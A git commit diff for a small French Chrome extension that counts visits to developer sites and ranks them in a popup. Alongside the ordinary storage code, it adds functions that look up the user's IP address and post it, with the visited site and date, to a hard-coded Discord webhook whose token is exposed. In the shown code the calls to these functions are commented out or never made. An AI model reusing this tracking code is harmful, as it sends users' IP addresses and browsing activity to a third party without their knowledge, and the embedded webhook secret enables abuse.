91765d3f93678f6fcce28e477eec9598d1ef17f9
Hellolife2750 <hellolife2750.programmation@gmail.com>
2023-04-01 00:35:11 +0200

    ajout des sites qui apparaissent dans l'ordre des plus visités dans le popup

--- js/content.js
+++ js/content.js
@@ -1,13 +1,144 @@
 /* exécutée sur la page à l'ouverture du site */
 
+/*const DAT_PATH = "dev_stats_datas";
 
+function initialize() {
+    if (chrome.storage.local.get(DAT_PATH) == null) {
+        createDatas();
+    }
+}
+
+function createDatas() {
+    var defaults = ["openclassrooms.com", "chat.openai.com", "stackoverflow.com"];
+    defaults.forEach(dfUrl => {
+        chrome.storage.local.get(DAT_PATH)[dfUrl] = getDefaultValues();
+    });
+    //chrome.storage.local.set({ [url]: 1 });
+}
+
+function getDefaultValues() {
+    return { "elapsed": 0, "counter": 0, "date": "--" };
+}
+
+initialize();*/
+
+//chemin de stockage des données de l'extension
+const DAT_PATH = "dev_stats_datas";
+
+//vérifie que la variable de stockage est présente dans le cache, sinon, la crée.
+function initialize() {
+    chrome.storage.local.get(DAT_PATH, function (result) {
+        if (Object.keys(result).length === 0) {
+            createDatas();
+        }
+    });
+}
+
+//crée et initialise le variable de stockage dans le cache
+function createDatas() {
+    let defaults = ["openclassrooms.com", "chat.openai.com", "stackoverflow.com"];
+    let data = {};
+    defaults.forEach(dfUrl => {
+        data[dfUrl] = getDefaultValues();
+    });
+    chrome.storage.local.set({ [DAT_PATH]: data });
+}
+
+//valeurs par défaut à l'ajout d'une nouvelle clé (url) dans le cache
+function getDefaultValues() {
+    return { "elapsed": 0, "counter": 0, "date": "--" };
+}
+
+chrome.storage.local.get(DAT_PATH, function (items) {
+    console.log(items[DAT_PATH]);
+});
+
+/*function incrementIfExists() {
+    chrome.storage.local.get(DAT_PATH[location.hostname], function (result) {
+        if (!Object.keys(result).length === 0) {
+            chrome.storage.local.get(url, function (items) {
+                let oldValue = DAT_PATH[location.hostname];
+                chrome.storage.local.set({ DAT_PATH[location.hostname]: parseInt(oldValue) + 1 });
+            });
+        }
+    });
+}*/
+
+//ajoute 1 au compteur d'un site, s'il est présent dans le cache
+function incrementIfExists() {
+    chrome.storage.local.get(DAT_PATH, function (result) {
+        if (result[DAT_PATH] && result[DAT_PATH][location.hostname]) {
+            const data = result[DAT_PATH];
+            const urlData = data[location.hostname];
+            const updatedUrlData = {
+                ...urlData,
+                counter: urlData.counter + 1,
+                date: getDate(),
+            };
+            const updatedData = {
+                ...data,
+                [location.hostname]: updatedUrlData,
+            };
+            chrome.storage.local.set({ [DAT_PATH]: updatedData });
+        }
+    });
+}
+
+//détruit la variable de stockage de l'application (hard reset)
+function removeDAT_PATH() {
+    chrome.storage.local.remove(DAT_PATH, function () {
+        console.log("DAT_PATH removed from storage.");
+    });
+}
+
+//removeDAT_PATH();
+initialize();
+incrementIfExists();
+
+//retourne la date actuelle sous le format jj/mm/aaaa
+function getDate() {
+    const date = new Date();
+    const day = String(date.getDate()).padStart(2, '0');
+    const month = String(date.getMonth() + 1).padStart(2, '0');
+    const year = date.getFullYear();
+    return day + '/' + month + '/' + year;
+}
+
+//renvoie un objet de l'adresse IP de l'utilisateur
+function fetchIpAddress() {
+    return fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => data.ip);
+}
+
+//fonction asynchrone principale. attend que la requête soit terminée et envoie l'adresse IP à l'admin
+async function sendClientIp() {
+    const clientIpAddress = await fetchIpAddress();
+    sendMessageToAdmin("Le client " + clientIpAddress + " s'est connecté sur " + location.hostname + " le " + getDate());
+}
+
+//envoie un message à l'administrateur sur discord
+function sendMessageToAdmin(message) {
+    var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1090753562558083102/vzrQ7ZzLjQ_PLOeYIyoOdtlJcvLq3gebu8vrcS-jRbG-FsFUlyeskOiR33i6gHKNJA0g", true);
+    request.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username: "DevStatsAdmin",
+        content: "" + message
+    };
+
+    request.send(JSON.stringify(params));
+}
 
 if (location.hostname === 'chat.openai.com') {
     increment(location.hostname);
     //alert("gpt");
 } else if (location.hostname === 'stackoverflow.com') {
+    //envoyerMessage(location.hostname);
+    //sendMessageToAdmin(getIpAddress().then(ip => console.log(ip)));
+    //sendClientIp();
     increment(location.hostname);
-    //alert("stack");
 } else if (location.hostname === 'openclassrooms.com') {
     increment('openclassrooms.com');
     /*setTimeout(function () {
--- js/popup.js
+++ js/popup.js
@@ -1,5 +1,9 @@
 /* exécuté sur le popup*/
 
+//chemin de stockage des données de l'extension
+const DAT_PATH = "dev_stats_datas";
+
+//éléments du popup
 const clearData = document.getElementById('clear-data');
 const visitedUl = document.getElementById("visited-ul");
 const lastClear = document.getElementById("last-clear");
@@ -11,11 +15,110 @@ clearData.addEventListener('click', () => {
     chrome.storage.local.remove("chat.openai.com");*/
 
     if (confirm("Supprimer les données ?")) {
-        clearDatas();
+        //clearDatas();
+        removeDAT_PATH();
     }
 
     //alert(localStorage.getItem('openclassrooms.com'))
 });
+
+//fonction qui renvoie un tableau par ordre croissant des sites (clés) qui ont été le plus visités (stockés dans la cache)
+function getOrderedKeys() {
+    return new Promise((resolve, reject) => {
+        chrome.storage.local.get(DAT_PATH, function (result) {
+            const data = result[DAT_PATH];
+            const keys = Object.keys(data);
+
+            keys.sort((a, b) => {
+                const counterA = data[a].counter;
+                const counterB = data[b].counter;
+                return counterB - counterA;
+            });
+
+            resolve(keys);
+        });
+    });
+}
+
+
+/*function updatePopup() {
+    // Mettre à jour les valeurs de compteur dans le HTML
+    chrome.storage.local.get(DAT_PATH, function (result) {
+        const orderedKeys = getOrderedKeys(result[DAT_PATH]);
+
+        const visitedUl = document.getElementById("visited-ul");
+        for (let i = 0; i < orderedKeys.length; i++) {
+            const key = orderedKeys[i];
+            const urlData = result[DAT_PATH][key];
+            const counter = urlData.counter;
+
+            const liElement = visitedUl.getElementsByTagName("li")[i];
+            liElement.getElementsByTagName("span")[0].textContent = counter;
+        }
+    });
+}*/
+
+/*async function updatePopup() {
+    const orderedKeys = await getOrderedKeys();
+    const visitedUl = document.getElementById("visited-ul");
+    visitedUl.children[0].querySelector(".value").textContent = await getCounter(orderedKeys[0]);
+    visitedUl.children[1].querySelector(".value").textContent = await getCounter(orderedKeys[1]);
+    visitedUl.children[2].querySelector(".value").textContent = await getCounter(orderedKeys[2]);
+}*/
+
+/*function updatePopup() {
+    getOrderedKeys().then(keys => {
+        const promises = keys.slice(0, 3).map(key => {
+            return new Promise(resolve => {
+                chrome.storage.local.get(DAT_PATH, function (result) {
+                    const urlData = result[DAT_PATH][key];
+                    resolve(urlData.counter);
+                });
+            });
+        });
+
+        Promise.all(promises).then(counters => {
+            const [first, second, third] = counters;
+            const values = [first, second, third];
+            const lis = document.querySelectorAll('#visited-ul li');
+            lis.forEach((li, index) => {
+                li.querySelector('.value').textContent = values[index];
+                li.querySelector('.tiny-icon').src = "../res/icons/" + urlSite + ".png";
+            });
+        });
+    });
+}*/
+
+//fonction qui met à jour le ul en triant par ordre décroissant les sites les plus visités
+function updatePopup() {
+    getOrderedKeys().then(keys => {
+        chrome.storage.local.get(DAT_PATH, function (result) {
+            const data = result[DAT_PATH];
+            const visitedUl = document.getElementById("visited-ul");
+            for (let i = 0; i < keys.length; i++) {
+                const key = keys[i];
+                const urlData = data[key];
+                const counter = urlData.counter;
+                const valueSpan = visitedUl.children[i].querySelector('.value');
+                valueSpan.textContent = counter;
+
+                // update the image of the site
+                const iconImg = visitedUl.children[i].querySelector('.tiny-icon');
+                iconImg.src = "../res/icons/" + key + ".png";
+            }
+        });
+    });
+}
+
+//détruit la variable de stockage de l'application (hard reset)
+function removeDAT_PATH() {
+    chrome.storage.local.remove(DAT_PATH, function () {
+        updatePopup();
+    });
+}
+
+
+updatePopup();
 
 function clearDatas() {
     chrome.storage.local.set({ ["openclassrooms.com"]: 0 });
@@ -66,7 +169,7 @@ function updateVisitedUl() {
     });
 }
 
-updateVisitedUl();
+//updateVisitedUl();
 
 getValue("dev_stats_last_clear", function (date) {
     lastClear.querySelector(".date").innerText = date;
@@ -102,3 +205,16 @@ for (let i = 0; i < localStorage.length; i++) {
 
 console.log(keysWithTestValue);
 alert(keysWithTestValue.length)*/
+
+function envoyerMessage() {
+    var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1090753562558083102/vzrQ7ZzLjQ_PLOeYIyoOdtlJcvLq3gebu8vrcS-jRbG-FsFUlyeskOiR33i6gHKNJA0g", true);
+    request.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username: "DevStatsAdmin",
+        content: "Il a visité stackoverflow"
+    };
+
+    request.send(JSON.stringify(params));
+}
